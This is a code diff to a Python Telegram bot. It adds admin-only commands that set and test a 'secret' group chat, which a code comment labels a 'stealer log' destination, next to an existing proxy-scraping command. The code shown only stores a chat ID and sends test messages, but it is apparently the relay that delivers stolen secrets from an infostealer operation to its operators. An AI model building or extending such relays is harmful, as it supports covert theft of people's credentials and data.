@@ -1765,6 +1765,43 @@ def handle_update(update):
             f"<i>{DEVELOPER}</i>")
         return
 
+    # --- /secgcset (secret stealer log GC) ---
+    if text.startswith("/secgcset"):
+        if int(user_id) not in ADMIN_IDS:
+            return
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2:
+            current = get_secret_gc()
+            send_message(chat_id,
+                f"<b>Secret GC</b>\n\n"
+                f"Current: <code>{current or 'Not set'}</code>\n\n"
+                f"<code>/secgcset CHAT_ID</code> or <code>/secgcset here</code>\n\n"
+                f"<i>{DEVELOPER}</i>")
+            return
+        target = parts[1].strip()
+        if target.lower() == "here":
+            target = str(chat_id)
+        set_secret_gc(int(target))
+        send_message(chat_id,
+            f"<b>Secret GC Set</b>\n\n"
+            f"Chat ID: <code>{target}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
+        return
+
+    # --- /gctest ---
+    if text == "/gctest":
+        if int(user_id) not in ADMIN_IDS:
+            return
+        gc_id = get_secret_gc()
+        if not gc_id:
+            send_message(chat_id, f"<b>No secret GC configured.</b>\n\nUse /secgcset first.\n\n<i>{DEVELOPER}</i>")
+            return
+        try:
+            send_message(gc_id, "Logging system is working ✅")
+            send_message(chat_id, f"<b>Test sent successfully.</b>\n\n<i>{DEVELOPER}</i>")
+        except Exception as e:
+            send_message(chat_id, f"<b>Failed:</b> {str(e)[:60]}\n\n<i>{DEVELOPER}</i>")
+
     # --- /scrapeproxies (admin) ---
     if text == "/scrapeproxies":
         if not is_admin(user_id):
